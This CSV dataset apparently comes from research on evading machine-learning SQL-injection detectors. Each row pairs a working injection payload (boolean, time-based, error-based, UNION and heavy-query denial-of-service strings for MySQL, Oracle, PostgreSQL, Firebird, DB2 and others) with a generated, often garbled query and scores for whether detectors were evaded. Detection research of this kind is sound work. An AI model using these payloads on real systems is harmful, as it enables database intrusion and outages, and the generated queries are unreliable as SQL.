,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
8598,"1' in boolean mode) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)#",SELECT MIN(sql injection) FROM SQL_Inceive_message WHERE NOT chr(76)||chr(65) = 6537 = dbms_pipe.receive_message(chr(65),1,1,0,0,1,0,0
8599,1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cgiu'='cgiu,"SELECT * FROM SQL_injection, SELECT case FROM SQL_injection WHERE NOT 7756 = 7756 = 'dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(7756)",0,1,1,0,0,0,0
8600,1%')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',SELECT case FROM SQL injection (SELECT SUM(SQL) FROM SQL)) AND NOT ((Select) FROM SQL SELECT SUM(SQL) FROM SQL),0,1,0,0,1,0,0
8601,"1%' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT '%' OR %%=',0,1,0,0,0,0,0
8602,"1%"")) and 7358=6986--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
8603,"1"") where 2136=2136 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL_injection WHERE NOT rdb$types = ""2136 = 2136 = 2136 OR 7552 = (select count(*) FROM rdb$functions as t3)--",0,1,0,0,0,0,0
8604,-7452 where 2224=2224 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,SELECT MIN(case) FROM SQL_injection) FROM SQL_injection WHERE 2224 = 2224 OR 4747 = dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)| -7452 WHERE NOT SELECT SQL_utility.sqlid_to_sqlhash(sqlid_to_sqlhash(2224 = 2224 = 247 = dbms_utility.sqlid_to_sqlhash((chr(112)||chr(112)||chr(112) = -7452,0,1,0,0,0,0,0
8605,"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",SELECT MIN(select) FROM SQL injection_detection,0,0,0,1,1,1,0
8606,1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,SELECT MIN(select) FROM SQL injection SELECT MIN(select) FROM SQL SELECT 8469 = 8469 = 8469 = 8469;select (case when(4769 = 4769) FROM mysql.db) end)#,0,1,0,0,0,0,0
8607,1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('esal'='esal,SELECT * FROM SQL injection_deficite' ORDER BY *(select),1,0,1,0,1,1,0
8608,"1%' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",SELECT MIN(*) FROM SQL_injections WHERE NOT sysusers ='sq injection',1,1,1,1,1,1,1
8609,"1)) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","SELECT NOT (null)---written FROMregexp_substring(repeat(right(right(char(5012),5000000000) FROM SQL_inject, SELECT created_from, MIN(repeat(right(char(5012) FROMregexp_substring(repeat(right(char(5012),5000000000) FROM query: 1) and query: 1) and query: 109||char(79)||char(90) = 'valid'",1,1,0,0,1,0,0
8610,1)) as xcsm where 9231=9231;select sleep(5)#,"SELECT MIN(select) FROM SQL injection AS _evade_select_run, SELECT MIN(select sleep(5)#) FROM SQL injection",0,1,0,0,1,0,0
8611,"1"") as kuuf where 6908=6908;if(7899=7899) select 7899 else drop function zbbp--",SELECT 7899 = 7899 else drop function zbbp-- FROM SQL injection,1,1,0,1,0,0,0
8612,"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm","SELECT COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm'",1,1,0,0,0,0,0
8613,1') or (select * from (select(sleep(5)))ydpu),SELECT DISTINCT select(sleep(5))) FROM SQL injection_detective WHERE NOT SQL_injection_method_code = 'example',1,1,0,0,1,0,0
8614,1');begin user_lock.sleep(5); end,SELECT MIN(user_lock.sleep(5); end) FROM SQL injection detection,1,1,0,0,1,0,0
8615,"-9208%"")) or 8571=8571--",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT -9208%) OR 8571 = 8571 = 8571,1,1,0,0,0,0,0
8616,"1'||(select 'yzdz' where 5021=5021;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
8617,"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","SELECT NOT SQL_substring(repeat(right(3702),0) FROM SQL AS _valid_inject FROM query: 1) as kaew WHERE NOT SQL_inject = '2658=2658;call regexp_substring(repeat(right(char(3702),500000000)'",1,1,0,0,1,0,0
8618,1;select (case when (5796=8326) then 5796 else 5796*(select 5796 from information_schema.character_sets) end)#,SELECT 5796 FROM SQL injection (SELECT 5796 FROM information_schema.character_sets)# FROM SQL injection),1,1,1,1,1,1,1
8619,"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz","SELECT MIN(*) FROM generate_series(1,5000000)",1,1,0,0,0,0,0
8620,"1"" and 7533=7533 and ""dqjp""=""dqjp","SELECT DISTINCT euclay_injection FROM SQL_injection WHERE NOT dqjp"" = 7533 = 7533 AND ""dqjp"" = 'dqjp""",1,1,0,0,0,0,0
8621,"1)) as queb where 2449=2449 union all select null,null#",SELECT MIN(sql injection) FROM SQL - SELECT STUDENT_Null# FROM SQL SELECT 2449 = 2449 = 2449,1,1,1,1,0,1,0
8622,-5585' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),SELECT MIN(case) FROM SQL injection detection WHERE NOT SELECT -5585' OR -5485 ='select upper(xmltype(chr(113)||chr(113)||chr(113)||chr(106)||chr(62)) FROM SQL,0,1,0,0,1,0,0
8623,"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4","SELECT MIN(*) FROM SQL injection detection WHERE NOTrdb$types = 't2,rdb$collations'",1,1,0,1,1,1,0
8624,"1""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sys2,sysusers as sys4,sysusers as sys7--",1,1,0,1,0,0,0
8625,"1%"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM dual) AND % = 'SQL',0,1,0,0,1,0,0
8626,"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT NOT SQL_substring(repeat(left(crypt_key)||char(80) FROMregexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(514) ='sql injection',1,1,0,0,1,0,0
8627,"1%"");select case when 9390=5752 then 1 else null end--",SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 9390 = 5752 AND NOT 9390 = 5752 AND NOT 9390 = 5752 AND NOT 9390 = 5752 AND NOT 9390 = 5752 AND NOT 9390 = 5752 AND NOT 9390 = 5752 AND NOT 91_all end-- end--,1,1,1,1,0,1,0
8628,"1) where 7485=7485 and make_set(8403=8403,8899)--","SELECT NOT SQL_inject_name FROM query: 1) WHERE 8403 = 8403,8899)-- if NOT SQL_inject_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_engine_workshop_-'",1,1,0,0,1,0,0
8629,1) as sglv where 7676=7676;begin dbms_lock.sleep(5); end--,SELECT NOT dbms_lock.sleep(5); end-- SELECT FROM SQL AS _sglv WHERE NOT 7676 = 7676;begin = dbms_lock.sleep(5);,1,1,0,0,0,0,0
8630,1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# sipo,SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(Select)||chr(3754 = 0,0,1,0,0,1,0,0
8631,"1%"" and 2388=benchmark(5000000,md5(0x6d457153))#",SELECT MIN(0x6d457153) FROM SQL injections,1,1,1,1,1,1,1
8632,"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--","SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT elt(6237 = 5615 = 5615 AND NOT elt(6237,7469) = 7158)",0,1,0,0,1,0,0
8633,"1'+(select pxsd where 2576=2576 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'","SELECT * FROM SQL_injection_details WHERE NOT elt(1808 = 1808,concat(0x7171706a71), '+'' FROM SQL_Injection'",1,1,0,0,1,0,0
8634,"1""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
8635,1)));select pg_sleep(5) and (((9476=9476,"SELECT pg_sleep(5),((9476 = 9476) FROM SQL injection_detection",1,1,0,0,1,0,0
8636,"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo","SELECT DISTINCT fbwo FROM SQL injection_detective WHERE NOT 8919 = 275 AND NOT fbwo_=""fbwo""",1,0,1,1,1,1,1
8637,"1');select * from generate_series(7494,7494,case when (7494=7854) then 1 else 0 end) limit 1--",SELECT * FROM query_series WHERE NOT SQL_injection_method_code ='sq injection' ORDER BY case LIMIT 1,0,0,1,1,1,1,1
8638,"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('kqqf'='kqqf","SELECT DISTINCT t1.select, t1.select (select) FROM (SELECT SUM(select) FROM SQL injection) AS t1 JOIN (SELECT SUM(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM SQL)) and ((select) FROM (SELECT SUM(select) FROM (SELECT MIN(select,'select (select) FROM (SELECT MIN(select) FROM SQL SELECT SUM(select) FROM (SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SQL SELECT SUM(select) FROM (SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select)",0,0,0,0,1,0,0
8639,"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""vlev"" like ""vlev",SELECT * FROM (SELECT * FROM SQL_injection) ORDER BY(select),0,0,0,0,1,0,0
8640,"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",SELECT DISTINCT sckh FROM SQL injection detection WHERE NOT syst injection ='sqpjq' AND'sckh' ='sckh',1,1,1,0,1,1,0
8641,"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","SELECT MIN(select) FROM SQL injection_detection WHERE 2610 = 2610 = 2610 OR 1 group = ""concat(0x7171706a71,(select)"" AND min(0)# = ""discuss""",0,1,0,0,0,0,0
8642,"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""vabm""=""vabm","SELECT COUNT(*) FROM all_users WHERE NOT all_users IN (SELECT t3.all_users FROM table_users WHERE NOT all_users = ""sq injection detection"")",1,1,0,0,1,0,0
8643,"1%"") union all select null,null,null,null,null,null,null,null,null,null--",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
8644,"1"") as jaxh where 6318=6318 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--","SELECT MIN(select) FROM SQL injection_diagnosis WHERE 6318 = 6318 AND extractvalue(7982,concat(0x7171706a71) = ""SQL injection detection""",0,1,0,0,1,0,0
8645,"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('swua' like 'swua",SELECT DISTINCT (swua) FROM SQL injection) ORDER BYSELECT elt(1297 = 1297,0,1,1,0,0,0,0
8646,"1' in boolean mode) or elt(6272=6272,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_detect WHERE NOT SELECT SELECT elt(6272 = 6272,sleep(5))# FROM SQL injection",0,1,0,0,1,0,0
8647,"-1287"") as bbzg where 1475=1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#","SELECT MIN(sql injection) FROM SQL_injection WHERE ""1475 = 1475 = 1475,1475,1475,1475,1475,1475,1475,1475#"" ='sq injection'",1,1,0,0,0,0,0
8648,"1%"") or elt(6272=6272,sleep(5)) and (""%""=""",SELECT MIN(sleep(5)) FROM SQL injection detection,1,1,0,0,1,0,0
8649,"1%'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SQL_injection WHERE NOT md5(0x4b774c75) = 'example'",1,1,0,1,1,1,0
8650,"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf","SELECT 'nbsf' FROM SQL_injection, SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(sql)')",0,1,0,0,1,0,0
8651,-3422%') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',SELECT MIN(select case) FROM SQL injection detection,0,0,0,1,1,1,0
8652,"1%'))) union all select null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
8653,1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,SELECT MIN(select) FROM SQL injection detection),0,0,0,0,1,0,0
8654,1'||(select 'tvcy' where 5592=5592 order by 1#,SELECT tvcy FROM SQL injection detection WHERE 5592 = 5592 ORDER BY 1#,1,1,1,1,0,1,0
8655,"1) and 2388=benchmark(5000000,md5(0x6d457153))#",SELECT NOT md5(0x6d457153) FROM SQL AS t1 JOIN query: 1 AND query: 1 AND md5(0x6d457153) = 'anal SQL injection',0,1,0,0,1,0,0
8656,"1')) union all select null,null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql injection) FROM SELECT SUM(swich) FROM SQL SELECT MIN(sql,null,null,null,null,null FROM SQL, 'don' FROM SQL SELECT SUM(null, null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,",1,0,1,0,0,0,0
8657,"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",SELECT dbms_pipe.receive_message(chr(67)||chr(67)||chr(67)||chr(67) FROM SQL injections EXCEPT SELECT dbms_pipe.receive_message FROM SELECT dbms_pipe.receive_message(chr(67)||chr(67)||chr(67) FROM SQL injection) FROM SELECT dbms_pipe.receive_message(chr(67)||chr(67)||chr(67) FROM SELECT dbms_pipe.receive_message(chr(67) FROM SQL SELECT dbms_pipe.receive_message(chr(67)||chr(67) FROM SELECT dbms_pipe.receive_message(chr(67) FROM SELECT dbms_pipe.receive_message(ch,1,1,0,0,1,0,0
8658,1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('uqfs'='uqfs,SELECT DISTINCT'seqpjq' FROM SQL injection',1,1,1,1,1,1,1
8659,"1"") where 2602=2602 and 8407=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM SQL_injection_detect_detect_code WHERE 2602 = 2602 AND 8407 =(select count(*) FROM generate_series(1,5000000)",1,1,0,0,1,0,0
8660,"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",SELECT (SELECT SUM(case) FROM SQL_injection) AND (%) = 'evade_schema.system_users'),0,1,0,0,0,0,0
8661,"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('dcys' like 'dcys",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
8662,"1') where 2725=2725 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL_injection WHERE NOT rdb$types = ""2725 = 225"" AND 9254 =(select count(*) FROM SQL injection detection""",1,1,0,0,1,0,0
8663,"1'+(select 'uzaw' where 9900=9900 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",SELECT MIN(select count(*) FROM SQL injection',1,1,1,0,1,1,0
8664,"-5840') or elt(1032=1032,3623)","SELECT MIN(1032 = 1032,3623) FROM SQL injection",1,1,0,0,1,0,0
8665,1';select (case when (7990=7627) then 7990 else 1/(select 0) end)--,SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
8666,"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",SELECT MIN(repeat(right(right(right(right(right(right)) FROM SQL injection detection) FROM query: 1 ORDER BY result_repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(100)||char(121) FROM SELECT SQL) FROM SELECT MIN(repeat(repeat(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right)|char(5000000000),1,1,0,0,1,0,0
8667,"-1956"") where 1448=1448 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",SELECT MIN(case) FROM SQL injection detection WHERE 1448 = 1448 = 1448 OR 3440 = cast((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113),0,1,0,0,0,0,0
8668,"1) and 8407=(select count(*) from generate_series(1,5000000))","SELECT MIN(*) FROM query_series(1,5000000) FROM SQL injection detection",1,1,0,0,1,0,0
8669,"1%"" and elt(5345=8751,8751) and ""%""=""","SELECT MIN(8751,8751) FROM SQL injection detection WHERE NOT SELECT SELECT MIN(5345 = 8751,8751) AND ""%"" ='sq injection'",1,1,0,0,0,0,0
8670,1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,SELECT dbms_lock.sleep(5); FROM SQL injection AS t1 JOIN Query: 1'||(select 'ifts' FROM SQL injection'),1,1,0,0,1,0,0
8671,"1))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = t1,all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
8672,"1'||(select 'dbxr' where 4014=4014 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",SELECT MIN(select) FROM SQL injection detection WHERE 4014 = 4014 AND all_users = 9660 = (SELECT SUM(select) FROM SQL),0,1,0,0,0,0,0
8673,"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE 6056 = 6056 OR 6056 = 6056 OR NOT 6056 = 6056 ORDER BY floor(rand(0)*2),0,1,0,0,1,0,0
